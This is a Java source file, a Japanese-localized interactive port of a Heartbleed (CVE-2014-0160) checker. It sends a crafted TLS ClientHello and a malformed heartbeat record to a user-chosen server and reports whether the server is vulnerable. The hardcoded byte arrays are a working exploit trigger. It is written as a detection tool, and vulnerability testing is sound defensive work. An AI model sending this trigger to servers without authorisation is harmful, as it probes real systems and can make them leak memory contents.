/* Java implementation of the Heartbleed test.
 *
 * Copyright (c) 2014, Vishal Verma <vish@slowpoison.net>
 * Based on Python ssltest.py demo of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 *
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

/**
 * @author reinforchu , slowpoison
 */

/*
 * I was localized to Japanese.
 * Has been modified to be able to run interactive.
 * Original repository: https://github.com/slowpoison/Heartbleed
 */


package tv.reinforce.heartbleed;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;

public class Heartbleed {
	private static class SSLPacket {
		int type, ver, len;
		byte[] pay = null;
		public SSLPacket(int type, int ver, int len) {
			this.type = type;
			this.ver = ver;
			this.len = len;
		}
	};

	private static byte sslHello[] = new byte[] {
		0x16, 0x03, 0x02, 0x00, (byte)0xdc, 0x01, 0x00, 0x00, (byte) 0xd8, 0x03, 0x02, 0x53,
		0x43, 0x5b, (byte) 0x90, (byte) 0x9d, (byte)0x9b, 0x72, 0x0b, (byte) 0xbc,  0x0c, (byte) 0xbc, 0x2b, (byte) 0x92, (byte) 0xa8, 0x48, (byte) 0x97, (byte) 0xcf,
		(byte) 0xbd, 0x39, 0x04, (byte) 0xcc, 0x16, 0x0a, (byte) 0x85, 0x03,  (byte) 0x90, (byte) 0x9f, 0x77, 0x04, 0x33, (byte) 0xd4, (byte) 0xde, 0x00,
		0x00, 0x66, (byte) 0xc0, 0x14, (byte) 0xc0, 0x0a, (byte) 0xc0, 0x22,  (byte) 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, (byte) 0x88,
		0x00, (byte) 0x87, (byte) 0xc0, 0x0f, (byte) 0xc0, 0x05, 0x00, 0x35,  0x00, (byte) 0x84, (byte) 0xc0, 0x12, (byte) 0xc0, 0x08, (byte) 0xc0, 0x1c,
		(byte) 0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, (byte) 0xc0, 0x0d,  (byte) 0xc0, 0x03, 0x00, 0x0a, (byte) 0xc0, 0x13, (byte) 0xc0, 0x09,
		(byte) 0xc0, 0x1f, (byte) 0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32,  0x00, (byte) 0x9a, 0x00, (byte) 0x99, 0x00, 0x45, 0x00, 0x44,
		(byte) 0xc0, 0x0e, (byte) 0xc0, 0x04, 0x00, 0x2f, 0x00, (byte) 0x96,  0x00, 0x41, (byte) 0xc0, 0x11, (byte) 0xc0, 0x07, (byte) 0xc0, 0x0c,
		(byte) 0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15,  0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11,
		0x00, 0x08, 0x00, 0x06, 0x00, 0x03, 0x00, (byte) 0xff,  0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04,
		0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x34,  0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19,
		0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09,  0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08,
		0x00, 0x06, 0x00, 0x07, 0x00, 0x14, 0x00, 0x15,  0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13,
		0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f,  0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00,
		0x00, 0x0f, 0x00, 0x01, 0x01
	};

	private static byte sslHb[] = new byte[] {
		0x18, 0x03, 0x02, 0x00, 0x03,
		0x01, 0x40, 0x00
	};

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
		String server = "";
		String port = "";
		System.out.println("検査対象のサーバ名を入力してください");
		while(server.isEmpty()) {
			System.out.print("サーバ名>");
			try {
				server = br.readLine();
			} catch (IOException e) {
				e.printStackTrace();
			}
			if(server.length() > 255) {
				System.out.println("サーバ名が長すぎます");
				server = "";
				continue;
			}
		}
		System.out.println("ポート番号を入力してください (例: 443, 465)");
		while(port.isEmpty()) {
			System.out.print("ポート番号>");
			try {
				port = br.readLine();
			} catch (IOException e) {
				e.printStackTrace();
			}
			if(port.length() > 7) {
				System.out.println("ポート番号が長すぎます");
				port = "";
				continue;
			}
		}
		heartbleedClient(server, Integer.valueOf(port).intValue());
	}

	public static void heartbleedClient(String server, int port) {
		try {
			Socket s = new Socket(server, port);
			InputStream in = s.getInputStream();
			DataInputStream din = new DataInputStream(in);
			OutputStream out = s.getOutputStream();

			System.out.println("client hello を送信しています...");
			out.write(sslHello);

			System.out.println("server hello の応答を待っています...");
			while (true) {
				SSLPacket pkt = sslReadPacket(din);
				System.out.printf("タイプ %d, バージョン %d, 長さ  %d\n", pkt.type, pkt.ver, pkt.len);
				if (pkt.type == 22 && pkt.pay[0] == 0xE)
					break;
			};

			while (true) {
				System.out.println("heartbeat を送信しています...");
				out.write(sslHb);
				SSLPacket pkt = sslReadPacket(din);
				System.out.printf("タイプ %d, バージョン %d, 長さ  %d\n", pkt.type, pkt.ver, pkt.len);
				switch (pkt.type) {
				case 24:
					System.out.println("Heartbleed の脆弱性を検出しました");
					return;
				case 21:
					System.out.println("Heartbleed の脆弱性は検出されませんでした");
					return;
				default:
					System.out.println("heartbeat の応答が返ってきませんでした");
					return;
				}
			}

		} catch (IOException e) {
			System.err.println(e.getMessage());
		}
	}

	private static SSLPacket sslReadPacket(DataInputStream din) throws IOException {
		SSLPacket pkt = sslReadHeader(din);
		byte[] pay = new byte[pkt.len];
		din.readFully(pay);
		pkt.pay = pay;
		return pkt;
	}

	private static SSLPacket sslReadHeader(DataInputStream din) throws IOException {
		byte hdr[] = new byte[5];
		din.readFully(hdr);
		ByteBuffer b = ByteBuffer.wrap(hdr);
		int type = b.get();
		int ver = b.getShort();
		int len = b.getShort();

		return new SSLPacket(type, ver, len);
	}
}